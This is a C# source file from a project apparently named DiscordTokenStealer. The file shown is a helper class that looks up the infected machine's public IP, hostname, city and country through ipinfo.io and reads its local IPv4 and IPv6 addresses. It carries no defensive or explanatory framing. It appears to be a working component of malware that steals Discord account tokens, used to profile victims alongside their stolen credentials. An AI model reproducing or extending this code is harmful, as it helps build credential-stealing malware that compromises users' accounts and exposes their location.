using System;
using System.IO;
using System.Net;
using System.Linq;
using System.Net.Http;
using System.Text.Json;
using System.Net.Sockets;
using System.Threading.Tasks;
using System.Text.Json.Serialization;
#pragma warning disable 8618

namespace DiscordTokenStealer
{
    public static class IPInfo
    {
        private static readonly Uri IpInfoUri = new Uri("https://ipinfo.io/");
        public static async Task<IPInformation?> GetIpInformation()
        {
            using HttpClient client = new HttpClient(new HttpClientHandler { UseProxy = true, Proxy = new WebProxy() }, true);
            using HttpResponseMessage response = await client.GetAsync(IpInfoUri);
            await using Stream json = await response.Content.ReadAsStreamAsync();
            return await JsonSerializer.DeserializeAsync<IPInformation>(json);
        }

        public static async Task<IPAddress?> GetLocalIPv4()
        {
            return (await Dns.GetHostEntryAsync(Dns.GetHostName())).AddressList.FirstOrDefault(address =>
                address.AddressFamily == AddressFamily.InterNetwork);
        }

        public static async Task<IPAddress?> GetLocalIPv6()
        {
            return (await Dns.GetHostEntryAsync(Dns.GetHostName())).AddressList.FirstOrDefault(address =>
                address.AddressFamily == AddressFamily.InterNetworkV6);
        }
        
        public class IPInformation
        {
            [JsonPropertyName("ip")] public string IP { get; set; }
            [JsonPropertyName("hostname")] public string Hostname { get; set; }
            [JsonPropertyName("city")] public string City { get; set; }
            [JsonPropertyName("country")] public string Country { get; set; }
        }
    }
}